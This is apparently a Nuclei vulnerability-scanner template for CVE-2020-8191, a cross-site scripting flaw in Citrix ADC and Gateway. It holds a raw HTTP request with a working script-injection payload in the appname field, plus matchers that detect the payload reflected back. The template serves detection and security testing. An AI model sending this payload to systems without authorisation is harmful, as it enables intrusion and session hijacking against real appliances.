id: CVE-2020-8191

info:
  name: Citrix ADC/Gateway - Cross-Site Scripting
  author: dwisiswant0
  severity: medium
  description: |
    Citrix ADC and Citrix Gateway versions before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18 and Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 contain a cross-site scripting vulnerability due to improper input validation.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary scripts in the context of the victim's browser, potentially leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Apply the necessary security patches or updates provided by Citrix to mitigate this vulnerability.
  reference:
    - https://support.citrix.com/article/CTX276688
    - https://nvd.nist.gov/vuln/detail/CVE-2020-8191
    - https://github.com/Elsfa7-110/kenzer-templates
    - https://github.com/jweny/pocassistdb
    - https://github.com/stratosphereips/nist-cve-search-tool
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-8191
    cwe-id: CWE-79
    epss-score: 0.91239
    epss-percentile: 0.9964
    cpe: cpe:2.3:o:citrix:application_delivery_controller_firmware:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: citrix
    product: application_delivery_controller_firmware
  tags: cve,cve2020,citrix,xss,vkev,vuln

http:
  - raw:
      - |
        POST /menu/stapp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-NITRO-USER: xpyZxwy6

        sid=254&pe=1,2,3,4,5&appname=%0a</title><script>alert(31337)</script>&au=1&username=nsroot

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "</title><script>alert(31337)</script>"

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
# digest: 4b0a0048304602210082c90dcde60cac1c6b27edce4e445d228a7437af72363ec60da0e1a7cc7d6dd5022100f84bfb2365671e0582b5ceeb1b691435d3b63196130c10232590fae15237c7c8:922c64590222798bb761d5b6d8e72950